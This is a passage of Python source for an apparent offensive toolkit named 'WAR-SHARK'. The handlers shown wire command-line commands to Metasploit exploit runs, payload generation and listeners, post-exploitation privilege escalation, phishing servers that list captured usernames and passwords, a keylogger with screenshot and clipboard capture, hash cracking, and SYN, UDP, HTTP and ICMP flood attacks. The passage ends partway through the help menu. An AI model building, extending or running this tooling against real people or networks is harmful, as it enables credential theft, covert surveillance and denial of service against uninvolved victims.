            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # Metasploit commands
    def _metasploit_search(self, args: List[str]) -> Dict:
        if not self.metasploit:
            return {'success': False, 'output': 'Metasploit not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: metasploit_search <query>'}
        query = ' '.join(args)
        result = self.metasploit.search_exploits(query)
        return {'success': result.success, 'output': result.output}
    
    def _metasploit_exploit(self, args: List[str]) -> Dict:
        if not self.metasploit:
            return {'success': False, 'output': 'Metasploit not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: metasploit_exploit <exploit> <payload> <target> [port]'}
        exploit = args[0]
        payload = args[1]
        target = args[2]
        port = int(args[3]) if len(args) > 3 else 445
        result = self.metasploit.run_exploit(exploit, payload, target, port)
        return {'success': result.success, 'output': result.output}
    
    def _metasploit_payload(self, args: List[str]) -> Dict:
        if not self.metasploit:
            return {'success': False, 'output': 'Metasploit not initialized'}
        if len(args) < 4:
            return {'success': False, 'output': 'Usage: metasploit_payload <payload_type> <lhost> <lport> <output_file> [format]'}
        payload_type = args[0]
        lhost = args[1]
        lport = int(args[2])
        output_file = args[3]
        format_type = args[4] if len(args) > 4 else 'exe'
        result = self.metasploit.generate_payload(payload_type, lhost, lport, output_file, format_type)
        return {'success': result.success, 'output': result.output}
    
    def _metasploit_handler(self, args: List[str]) -> Dict:
        if not self.metasploit:
            return {'success': False, 'output': 'Metasploit not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: metasploit_handler <lhost> <lport> [payload]'}
        lhost = args[0]
        lport = int(args[1])
        payload = args[2] if len(args) > 2 else None
        result = self.metasploit.start_handler(lhost, lport, payload)
        return {'success': result.success, 'output': result.output}
    
    def _metasploit_sessions(self, args: List[str]) -> Dict:
        if not self.metasploit:
            return {'success': False, 'output': 'Metasploit not initialized'}
        sessions = self.metasploit.get_sessions()
        if not sessions:
            return {'success': True, 'output': 'No active Metasploit sessions'}
        output = "Metasploit Sessions:\n"
        for s in sessions:
            output += f"  • {s['session_id']} - {s['target_host']}:{s['target_port']} ({s['exploit_module']})\n"
        return {'success': True, 'output': output}
    
    # Post-exploitation commands
    def _post_session(self, args: List[str]) -> Dict:
        if not self.post_exploit:
            return {'success': False, 'output': 'Post-exploitation not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: post_session <session_id> <command>'}
        session_id = args[0]
        command = ' '.join(args[1:])
        result = self.post_exploit.execute_on_session(session_id, command)
        return {'success': result.get('success', False), 'output': result.get('output', result.get('error', ''))}
    
    def _post_privesc(self, args: List[str]) -> Dict:
        if not self.post_exploit:
            return {'success': False, 'output': 'Post-exploitation not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: post_privesc <session_id> [method]'}
        session_id = args[0]
        method = args[1] if len(args) > 1 else 'auto'
        result = self.post_exploit.privilege_escalation(session_id, method)
        if result.get('success') and 'results' in result:
            output = "Privilege Escalation Results:\n"
            for r in result['results']:
                output += f"\n=== {r['method']} ===\n{r['output'][:500]}\n"
            return {'success': True, 'output': output}
        return {'success': result.get('success', False), 'output': result.get('output', result.get('error', ''))}
    
    def _post_sessions(self, args: List[str]) -> Dict:
        if not self.post_exploit:
            return {'success': False, 'output': 'Post-exploitation not initialized'}
        sessions = self.post_exploit.get_sessions()
        if not sessions:
            return {'success': True, 'output': 'No active sessions'}
        output = "Active Sessions:\n"
        for s in sessions:
            output += f"  • {s['id']} - {s['address']} (created: {s['created_at'][:19]})\n"
        return {'success': True, 'output': output}
    
    # Reverse engineering commands
    def _rev_analyze(self, args: List[str]) -> Dict:
        if not self.reverse_engine:
            return {'success': False, 'output': 'Reverse engineering not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: rev_analyze <binary_path> [basic|advanced]'}
        binary_path = args[0]
        analysis_type = args[1] if len(args) > 1 else 'basic'
        result = self.reverse_engine.analyze_binary(binary_path, analysis_type)
        return {'success': result.success, 'output': result.output}
    
    def _rev_strings(self, args: List[str]) -> Dict:
        if not self.reverse_engine:
            return {'success': False, 'output': 'Reverse engineering not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: rev_strings <binary_path> [min_length]'}
        binary_path = args[0]
        min_length = int(args[1]) if len(args) > 1 else 4
        result = self.reverse_engine.extract_strings(binary_path, min_length)
        return {'success': result.success, 'output': result.output}
    
    def _rev_disassemble(self, args: List[str]) -> Dict:
        if not self.reverse_engine:
            return {'success': False, 'output': 'Reverse engineering not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: rev_disassemble <binary_path> [function]'}
        binary_path = args[0]
        function = args[1] if len(args) > 1 else None
        result = self.reverse_engine.disassemble(binary_path, function)
        return {'success': result.success, 'output': result.output}
    
    def _rev_jobs(self, args: List[str]) -> Dict:
        if not self.reverse_engine:
            return {'success': False, 'output': 'Reverse engineering not initialized'}
        jobs = self.reverse_engine.get_jobs()
        if not jobs:
            return {'success': True, 'output': 'No reverse engineering jobs'}
        output = "RE Jobs:\n"
        for j in jobs:
            output += f"  • {j['job_id']} - {j['binary_path']} ({j['analysis_type']}) - {j['status']}\n"
        return {'success': True, 'output': output}
    
    # Social engineering
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # Keylogger commands
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # Cracking commands
    def _crack(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        hash_type = args[0]
        hash_value = args[1]
        wordlist = args[2] if len(args) > 2 else None
        
        job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
        return {
            'success': True,
            'output': f"🔓 Cracking job started: {job_id}\nHash type: {hash_type}\nHash: {hash_value[:20]}...\nUse 'crack_status {job_id}' to check progress"
        }
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job_id = args[0]
        job = self.cracking.get_job_status(job_id)
        if not job:
            return {'success': False, 'output': f'Job {job_id} not found'}
        
        output = f"🔓 Cracking Job Status: {job_id}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    # Docker commands
    def _docker_scan(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        image = args[0]
        result = self.docker_scanner.scan_image(image)
        if result['success']:
            output = f"🐳 Docker scan of {image} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            for v in result.get('vulnerabilities', [])[:5]:
                output += f"  • {v.get('description', '')[:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        return self._generic('docker info')
    
    def _docker_ps(self, args: List[str]) -> Dict:
        return self._generic('docker ps')
    
    def _docker_images(self, args: List[str]) -> Dict:
        return self._generic('docker images')
    
    def _docker_bench(self, args: List[str]) -> Dict:
        return self._generic('docker run --rm -it --net host --pid host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc -v /usr/lib/systemd:/usr/lib/systemd docker/docker-bench-security')
    
    # IP management
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = self.tools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            domain = self.tools.ip_to_domain(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        
        output = f"🦈 WAR-SHARK IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        return {'success': True, 'output': output}
    
    # Domain commands
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            if self.domain_hosting:
                domain = self.domain_hosting.translate_ip_to_domain(ip)
                if domain:
                    return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            
            domain = self.tools.ip_to_domain(ip)
            if domain:
                return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            return {'success': False, 'output': f"No domain found for IP {ip}"}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        domain = args[0]
        if self.domain_hosting:
            ip = self.domain_hosting.translate_domain_to_ip(domain)
            if ip:
                return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
        
        ip = self.tools.domain_to_ip(domain)
        if ip:
            return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
        return {'success': False, 'output': f"No IP found for domain {domain}"}
    
    def _host_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting not enabled'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        ip = args[0]
        domain = args[1]
        port = int(args[2]) if len(args) > 2 else 8080
        
        domain_host = self.domain_hosting.host_domain(ip, domain, port)
        if domain_host:
            return {'success': True, 'output': f"Domain {domain} hosted on IP {ip}:{port}"}
        return {'success': False, 'output': f"Failed to host domain {domain}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting not enabled'}
        domains = self.domain_hosting.list_hosted_domains()
        if not domains:
            return {'success': True, 'output': 'No hosted domains'}
        output = "Hosted Domains:\n"
        for d in domains:
            status = "🟢 Active" if d['active'] else "🔴 Inactive"
            output += f"  • {d['domain']} -> {d['ip']} ({status})\n"
        return {'success': True, 'output': output}
    
    # Traffic commands
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # Nikto
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # DOS
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # System commands
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🦈 WAR-SHARK System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Docker Scans: {stats.get('total_docker_scans', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  Metasploit Sessions: {stats.get('total_metasploit_sessions', 0)}
  RE Jobs: {stats.get('total_re_jobs', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        
        report = f"""
🦈 WAR-SHARK Security Report
{'='*50}
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  Docker Scans: {stats.get('total_docker_scans', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _deploy_list(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments:
            return {'success': True, 'output': 'No deployments found'}
        output = "Deployments:\n"
        for d in deployments:
            status = "📄" if d['delivered'] else "⏳"
            output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
            output += f"     Target: {d['target']}\n"
        return {'success': True, 'output': output}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🦈 WAR-SHARK v{VERSION} - HELP MENU                              {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING COMMANDS (20+):{Colors.RESET}
║  ping <target> [count]         - Basic ping
║  ping_count <count> <target>   - Ping with count
║  ping_flood <target>           - Flood ping
║  ping_packet_size <size> <target> - Ping with packet size
║
║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS (25+):{Colors.RESET}
║  traceroute <target>           - Basic traceroute
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  mtr_report <target>           - MTR report
║
║{Colors.SUCCESS}📥 WGET COMMANDS (50+):{Colors.RESET}
║  wget_basic <url>              - Basic download
║  wget_recursive <url>          - Recursive download
║  wget_mirror <url>             - Mirror website
║  wget_continue <url>           - Resume download
║
║{Colors.SUCCESS}🌐 CURL COMMANDS (60+):{Colors.RESET}
║  curl <url>                    - Basic request
║  curl_post <url> <data>        - POST request
║  curl_json <url> <json>        - JSON POST
║  curl_headers <url> <header>   - Custom headers
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS (60+):{Colors.RESET}
║  nmap <target> [type]          - Basic scan
║  nmap_syn_scan <target>        - SYN scan
║  nmap_udp_scan <target>        - UDP scan
║  nmap_os_detection <target>    - OS detection
║  nmap_script_vuln <target>     - Vulnerability scan
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS (15+):{Colors.RESET}
║  nc_connect <host> <port>      - Connect
║  nc_listen <port>              - Listen
║  nc_scan <host> <port_range>   - Port scan
║
║{Colors.SUCCESS}🔒 SSH COMMANDS (30+):{Colors.RESET}
║  ssh_basic <user@host>         - Basic SSH
║  ssh_port <port> <user@host>   - SSH on custom port
║  ssh_local_forward <args>      - Local forward
║  scp_file <local> <remote>     - SCP file transfer
║
║{Colors.SUCCESS}💥 DOS COMMANDS (15+):{Colors.RESET}
║  dos_syn <ip> <port> <duration> - SYN flood
║  dos_udp <ip> <port> <duration> - UDP flood
║  dos_http <ip> <port> <duration> - HTTP flood
║  dos_icmp <ip> <duration>      - ICMP flood
║
║{Colors.SUCCESS}🎯 METASPLOIT COMMANDS:{Colors.RESET}
║  metasploit_search <query>     - Search exploits
║  metasploit_exploit <exploit> <payload> <target> [port] - Run exploit
║  metasploit_payload <type> <lhost> <lport> <output> - Generate payload
║  metasploit_handler <lhost> <lport> [payload] - Start handler
║  metasploit_sessions           - List sessions
║
